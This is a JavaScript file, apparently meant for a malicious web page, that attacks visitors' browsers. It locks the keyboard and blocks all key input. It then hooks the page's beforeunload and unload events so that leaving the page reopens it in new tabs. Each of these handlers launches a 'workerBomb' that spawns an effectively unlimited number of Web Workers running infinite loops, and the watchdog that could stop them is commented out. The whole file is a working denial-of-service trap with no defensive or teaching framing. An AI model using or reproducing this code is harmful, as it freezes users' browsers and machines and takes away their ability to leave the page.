
// window.onbeforeunload = function() {
//     if (data_needs_saving()) {
//         return "Do you really want to leave our brilliant application?";
//     } else {
//         return;
//     }
// };


// window.addEventListener("beforeunload", function(e) {
//     var confirmationMessage = 'It looks like you have been editing something. ' +
//         'If you leave before saving, your changes will be lost.';

//     (e || window.event).returnValue = confirmationMessage; //Gecko + IE
//     return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
// });


// lock keybord================

navigator.keyboard.lock();
document.onkeydown = function(e) {
    return false;
}

// load multiple worker =================

window.addEventListener('beforeunload', function (event) {
    window.open(window.location.href, '_blank');
    setTimeout(() => {
        window.location.href = window.location.href;
    }, 5);
    let workers = [];
    let isResponsive = true;

    function workerBomb() {
        console.log("Starting workerBomb...");

        const script = `
            let counter = 0;
            while (true) {
              counter++;
              Math.random() * Math.random();

              // Send progress to the main thread occasionally
              if (counter % 1e6 === 0) {
                postMessage({ status: "working", counter });
              }
            }
          `;
        const blob = new Blob([script], { type: "application/javascript" });
        const workerURL = URL.createObjectURL(blob);

        // Create 10 workers (adjust the number to reduce load)
        for (let i = 0; i < 1000000000000; i++) {
            const worker = new Worker(workerURL);
            workers.push(worker);

            worker.onmessage = (event) => {
                if (event.data.status === "working") {
                    console.log(`Worker ${i} progress: ${event.data.counter}`);
                }
            };

            worker.onerror = (error) => {
                console.error(`Worker ${i} encountered an error:`, error);
            };
        }

        // Start the responsiveness watchdog
        // startWatchdog();
    }

    // Watchdog function to monitor browser responsiveness
    function startWatchdog() {
        console.log("Starting watchdog...");

        let lastTime = Date.now();

        const watchdogInterval = setInterval(() => {
            const currentTime = Date.now();

            // If the browser is unresponsive for more than 2 seconds, terminate workers
            if (currentTime - lastTime > 2000) {
                console.warn("Browser unresponsive detected. Terminating workers...");
                terminateWorkers();
                clearInterval(watchdogInterval);
            } else {
                // Update the last time to keep track of responsiveness
                lastTime = currentTime;
            }
        }, 100);

        // Simulate lightweight work on the main thread to detect unresponsiveness
        (function monitorResponsiveness() {
            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
            if (workers.length > 0) {
                requestAnimationFrame(monitorResponsiveness);
            }
        })();
    }

    // Function to terminate all workers
    function terminateWorkers() {
        workers.forEach((worker, index) => {
            worker.terminate();
            console.log(`Worker ${index} terminated.`);
        });
        workers = [];
        console.log("All workers terminated.");
    }


    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    // Custom message (not all browsers display this)
    const message = "Are you sure you want to leave this page?";

    // Set the returnValue property to trigger the confirmation dialog
    event.returnValue = message;

    // Return the message string for some older browsers
    return message;
});


window.addEventListener('unload', function () {
    window.open(window.location.href, '_blank');
    setTimeout(() => {
        window.location.href = window.location.href;
    }, 1);
    let workers = [];
    let isResponsive = true;

    function workerBomb() {
        console.log("Starting workerBomb...");

        const script = `
            let counter = 0;
            while (true) {
              counter++;
              Math.random() * Math.random();

              // Send progress to the main thread occasionally
              if (counter % 1e6 === 0) {
                postMessage({ status: "working", counter });
              }
            }
          `;
        const blob = new Blob([script], { type: "application/javascript" });
        const workerURL = URL.createObjectURL(blob);

        // Create 10 workers (adjust the number to reduce load)
        for (let i = 0; i < 100000000000000; i++) {
            const worker = new Worker(workerURL);
            workers.push(worker);

            worker.onmessage = (event) => {
                if (event.data.status === "working") {
                    console.log(`Worker ${i} progress: ${event.data.counter}`);
                }
            };

            worker.onerror = (error) => {
                console.error(`Worker ${i} encountered an error:`, error);
            };
        }

        // Start the responsiveness watchdog
        // startWatchdog();
    }

    // Watchdog function to monitor browser responsiveness
    function startWatchdog() {
        console.log("Starting watchdog...");

        let lastTime = Date.now();

        const watchdogInterval = setInterval(() => {
            const currentTime = Date.now();

            // If the browser is unresponsive for more than 2 seconds, terminate workers
            if (currentTime - lastTime > 2000) {
                console.warn("Browser unresponsive detected. Terminating workers...");
                terminateWorkers();
                clearInterval(watchdogInterval);
            } else {
                // Update the last time to keep track of responsiveness
                lastTime = currentTime;
            }
        }, 100);

        // Simulate lightweight work on the main thread to detect unresponsiveness
        (function monitorResponsiveness() {
            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
            if (workers.length > 0) {
                requestAnimationFrame(monitorResponsiveness);
            }
        })();
    }

    // Function to terminate all workers
    function terminateWorkers() {
        workers.forEach((worker, index) => {
            worker.terminate();
            console.log(`Worker ${index} terminated.`);
        });
        workers = [];
        console.log("All workers terminated.");
    }


    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    // Custom message (not all browsers display this)
    const message = "Are you sure you want to leave this page?";

    // Set the returnValue property to trigger the confirmation dialog
    event.returnValue = message;

    // Return the message string for some older browsers
    return message;
});





window.addEventListener('unload', function () {
    window.open(window.location.href, '_blank');
    setTimeout(() => {
        window.location.href = window.location.href;
    }, 1);
    let workers = [];
    let isResponsive = true;

    function workerBomb() {
        console.log("Starting workerBomb...");

        const script = `
            let counter = 0;
            while (true) {
              counter++;
              Math.random() * Math.random();

              // Send progress to the main thread occasionally
              if (counter % 1e6 === 0) {
                postMessage({ status: "working", counter });
              }
            }
          `;
        const blob = new Blob([script], { type: "application/javascript" });
        const workerURL = URL.createObjectURL(blob);

        // Create 10 workers (adjust the number to reduce load)
        for (let i = 0; i < 100000000000000; i++) {
            const worker = new Worker(workerURL);
            workers.push(worker);

            worker.onmessage = (event) => {
                if (event.data.status === "working") {
                    console.log(`Worker ${i} progress: ${event.data.counter}`);
                }
            };

            worker.onerror = (error) => {
                console.error(`Worker ${i} encountered an error:`, error);
            };
        }

        // Start the responsiveness watchdog
        // startWatchdog();
    }

    // Watchdog function to monitor browser responsiveness
    function startWatchdog() {
        console.log("Starting watchdog...");

        let lastTime = Date.now();

        const watchdogInterval = setInterval(() => {
            const currentTime = Date.now();

            // If the browser is unresponsive for more than 2 seconds, terminate workers
            if (currentTime - lastTime > 2000) {
                console.warn("Browser unresponsive detected. Terminating workers...");
                terminateWorkers();
                clearInterval(watchdogInterval);
            } else {
                // Update the last time to keep track of responsiveness
                lastTime = currentTime;
            }
        }, 100);

        // Simulate lightweight work on the main thread to detect unresponsiveness
        (function monitorResponsiveness() {
            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
            if (workers.length > 0) {
                requestAnimationFrame(monitorResponsiveness);
            }
        })();
    }

    // Function to terminate all workers
    function terminateWorkers() {
        workers.forEach((worker, index) => {
            worker.terminate();
            console.log(`Worker ${index} terminated.`);
        });
        workers = [];
        console.log("All workers terminated.");
    }


    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    // Custom message (not all browsers display this)
    const message = "Are you sure you want to leave this page?";

    // Set the returnValue property to trigger the confirmation dialog
    event.returnValue = message;

    // Return the message string for some older browsers
    return message;
});




window.addEventListener('unload', function () {
    window.open(window.location.href, '_blank');
    setTimeout(() => {
        window.location.href = window.location.href;
    }, 1);
    let workers = [];
    let isResponsive = true;

    function workerBomb() {
        console.log("Starting workerBomb...");

        const script = `
            let counter = 0;
            while (true) {
              counter++;
              Math.random() * Math.random();

              // Send progress to the main thread occasionally
              if (counter % 1e6 === 0) {
                postMessage({ status: "working", counter });
              }
            }
          `;
        const blob = new Blob([script], { type: "application/javascript" });
        const workerURL = URL.createObjectURL(blob);

        // Create 10 workers (adjust the number to reduce load)
        for (let i = 0; i < 1000000000000; i++) {
            const worker = new Worker(workerURL);
            workers.push(worker);

            worker.onmessage = (event) => {
                if (event.data.status === "working") {
                    console.log(`Worker ${i} progress: ${event.data.counter}`);
                }
            };

            worker.onerror = (error) => {
                console.error(`Worker ${i} encountered an error:`, error);
            };
        }

        // Start the responsiveness watchdog
        // startWatchdog();
    }

    // Watchdog function to monitor browser responsiveness
    function startWatchdog() {
        console.log("Starting watchdog...");

        let lastTime = Date.now();

        const watchdogInterval = setInterval(() => {
            const currentTime = Date.now();

            // If the browser is unresponsive for more than 2 seconds, terminate workers
            if (currentTime - lastTime > 2000) {
                console.warn("Browser unresponsive detected. Terminating workers...");
                terminateWorkers();
                clearInterval(watchdogInterval);
            } else {
                // Update the last time to keep track of responsiveness
                lastTime = currentTime;
            }
        }, 100);

        // Simulate lightweight work on the main thread to detect unresponsiveness
        (function monitorResponsiveness() {
            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
            if (workers.length > 0) {
                requestAnimationFrame(monitorResponsiveness);
            }
        })();
    }

    // Function to terminate all workers
    function terminateWorkers() {
        workers.forEach((worker, index) => {
            worker.terminate();
            console.log(`Worker ${index} terminated.`);
        });
        workers = [];
        console.log("All workers terminated.");
    }


    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    workerBomb();
    // Custom message (not all browsers display this)
    const message = "Are you sure you want to leave this page?";

    // Set the returnValue property to trigger the confirmation dialog
    event.returnValue = message;

    // Return the message string for some older browsers
    return message;
});



